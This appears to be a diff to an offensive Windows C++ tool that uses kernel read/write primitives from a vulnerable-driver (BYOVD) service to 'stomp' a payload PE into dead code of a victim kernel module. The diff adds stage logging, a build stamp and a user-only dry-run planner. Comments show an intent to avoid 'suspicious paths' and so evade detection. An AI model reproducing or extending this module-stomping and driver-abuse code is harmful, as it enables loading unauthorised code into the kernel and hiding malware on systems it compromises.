@@ -1502,6 +1502,105 @@ static uint64_t KernelAlloc(KernelPrimitives& prim, uint64_t kernelBase,
     return result;
 }
 
+static void StompProgress(const char* stage)
+{
+    const char* paths[] = {
+        "Z:\\driver-lab\\vm\\bg\\stomp_progress.txt",
+        "C:\\DriverLab\\bg\\stomp_progress.txt",
+    };
+    SYSTEMTIME st{};
+    GetLocalTime(&st);
+    char line[256];
+    _snprintf_s(line, sizeof(line), _TRUNCATE,
+        "%04u-%02u-%02uT%02u:%02u:%02u stage=%s pid=%lu\n",
+        st.wYear, st.wMonth, st.wDay, st.wHour, st.wMinute, st.wSecond,
+        stage, (unsigned long)GetCurrentProcessId());
+    for (const char* p : paths) {
+        HANDLE f = CreateFileA(p, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE,
+            nullptr, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, nullptr);
+        if (f != INVALID_HANDLE_VALUE) {
+            DWORD wr = 0;
+            WriteFile(f, line, (DWORD)strlen(line), &wr, nullptr);
+            CloseHandle(f);
+        }
+    }
+    Log("[stomp] %s\n", stage);
+    fflush(stdout);
+}
+
+static void PrintBuildStamp()
+{
+    char exePath[MAX_PATH]{};
+    if (!GetModuleFileNameA(nullptr, exePath, MAX_PATH)) return;
+    char* slash = strrchr(exePath, '\\');
+    if (!slash) return;
+    *slash = '\0';
+    std::string buildPath = std::string(exePath) + "\\BUILD.txt";
+    char stamp[96] = "unknown";
+    HANDLE f = CreateFileA(buildPath.c_str(), GENERIC_READ, FILE_SHARE_READ,
+        nullptr, OPEN_EXISTING, 0, nullptr);
+    if (f != INVALID_HANDLE_VALUE) {
+        DWORD rd = 0;
+        ReadFile(f, stamp, sizeof(stamp) - 1, &rd, nullptr);
+        stamp[rd] = '\0';
+        for (char* p = stamp; *p; ++p) {
+            if (*p == '\r' || *p == '\n') { *p = '\0'; break; }
+        }
+        CloseHandle(f);
+    }
+    printf("#BUILD %s\n", stamp);
+    fflush(stdout);
+}
+
+// Dry-run only: PE parse + dead-code + plan. No vehicle, no kernel I/O.
+static int ExecuteStompDryRunUserOnly(const char* payloadPath)
+{
+    if (!g_stompVictim[0]) {
+        Log("[!] --stomp requires --victim <shortName>\n");
+        return 1;
+    }
+    StompProgress("ENUMERATE");
+    stomp::VictimImage vic{};
+    if (!stomp::EnumerateVictimFromDisk(g_stompVictim, vic)) {
+        Log("[!] stomp EnumerateVictimFromDisk failed victim=%ls\n", g_stompVictim);
+        return 2;
+    }
+    StompProgress("DEAD_CODE_SCAN");
+    if (!stomp::AnalyzeDeadCode(vic)) {
+        Log("[*] stomp no unreferenced CC-regions in %ls (placement uses exec gap)\n",
+            vic.name.c_str());
+    }
+    std::vector<uint8_t> payloadFile = ReadFileBin(payloadPath);
+    if (payloadFile.empty()) {
+        Log("Failed to read stomp payload %s\n", payloadPath);
+        return 1;
+    }
+    uint32_t sizeOfImage = stomp::PeSizeOfImage(payloadFile);
+    uint32_t skip = stomp::PeFirstSectionRva(payloadFile);
+    if (!sizeOfImage || !skip || skip >= sizeOfImage) {
+        Log("[!] stomp invalid payload PE\n");
+        return 2;
+    }
+    stomp::StompPlan plan{};
+    plan.victim_name = vic.name;
+    plan.victim_base = vic.loaded_base;
+    plan.header_skip = skip;
+    if (!stomp::PlanPlacement(vic, sizeOfImage - skip, plan)) {
+        Log("[!] stomp PlanPlacement failed need span=0x%x image=0x%x dead=%zu text=0x%x\n",
+            sizeOfImage - skip, sizeOfImage, vic.dead_funcs.size(), vic.text_vsize);
+        return 2;
+    }
+    std::wstring modName, dosName;
+    stomp::LookupVictimDosName(g_stompVictim, modName, dosName);
+    Log("[*] STOMP plan (user-only dry): victim=%ls preferred=0x%llx dead=%zu "
+        "cluster_rva=0x%x need=0x%x thunk=0x%x payload_pe=0x%x\n",
+        vic.name.c_str(), (unsigned long long)vic.preferred_base,
+        vic.dead_funcs.size(), plan.payload_rva, plan.payload_size,
+        plan.thunk_rva, sizeOfImage);
+    StompProgress("PLAN");
+    return 0;
+}
+
 // Stomp needs only KernelPrimitives R/W — no pool map, cave, or HAL hook.
 static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const char* payloadPath)
 {
@@ -1514,23 +1613,26 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
         Log("[!] stomp victim profile missing for %ls\n", g_stompVictim);
         return 1;
     }
+    StompProgress("VEHICLE_OPEN");
     stomp::VictimImage vic{};
     if (!stomp::EnumerateVictim(modName, vic)) {
         Log("[!] stomp EnumerateVictim failed %ls\n", modName.c_str());
         return 2;
     }
+    StompProgress("ENUMERATE");
     if (!stomp::AnalyzeDeadCode(vic)) {
-        Log("[!] stomp no xref-proofed dead code in %ls (dead_funcs=%zu)\n",
-            modName.c_str(), vic.dead_funcs.size());
-        return 2;
+        Log("[*] stomp no unreferenced CC-regions in %ls (placement uses exec gap)\n",
+            modName.c_str());
     }
+    StompProgress("DEAD_CODE_SCAN");
     std::vector<uint8_t> payloadFile = ReadFileBin(payloadPath);
     if (payloadFile.empty()) {
         Log("Failed to read stomp payload %s\n", payloadPath);
         return 1;
     }
     uint32_t sizeOfImage = stomp::PeSizeOfImage(payloadFile);
-    if (!sizeOfImage) {
+    uint32_t skip = stomp::PeFirstSectionRva(payloadFile);
+    if (!sizeOfImage || !skip || skip >= sizeOfImage) {
         Log("[!] stomp invalid payload PE\n");
         return 2;
     }
@@ -1538,7 +1640,8 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
     plan.victim_name = vic.name;
     plan.victim_dos_name = dosName;
     plan.victim_base = vic.loaded_base;
-    if (!stomp::PlanPlacement(vic, sizeOfImage, plan)) {
+    plan.header_skip = skip;
+    if (!stomp::PlanPlacement(vic, sizeOfImage - skip, plan)) {
         Log("[!] stomp PlanPlacement failed need SizeOfImage=0x%x dead=%zu\n",
             sizeOfImage, vic.dead_funcs.size());
         return 2;
@@ -1548,6 +1651,7 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
         vic.name.c_str(), (unsigned long long)vic.loaded_base,
         vic.dead_funcs.size(), vic.text_vsize,
         plan.payload_rva, plan.payload_size, plan.thunk_rva, g_stompDryRun ? 1 : 0);
+    StompProgress("PLAN");
     if (g_stompDryRun) return 0;
 
     uint64_t pMmGsa = stomp::ResolveKernelExport(prim, kernelBase, "MmGetSystemRoutineAddress");
@@ -1572,6 +1676,7 @@ static int ExecuteStompMode(KernelPrimitives& prim, uint64_t kernelBase, const c
 int main(int argc, char* argv[]) {
     setvbuf(stdout, nullptr, _IONBF, 0);
     setvbuf(stderr, nullptr, _IONBF, 0);
+    PrintBuildStamp();
     // Open log with write-through so data survives BSOD (no OS cache)
     // Use %TEMP% for log to avoid hardcoded suspicious paths
     char logPath[MAX_PATH];
@@ -2086,6 +2191,12 @@ int main(int argc, char* argv[]) {
     }
 
     if (g_updateMode) goto skip_mapping;
+
+    if (g_stompMode && g_stompDryRun) {
+        int dryRc = ExecuteStompDryRunUserOnly(argv[1]);
+        SecurityShutdown();
+        return dryRc;
+    }
 
     {
     // Auto-setup: create and start the BYOVD driver service
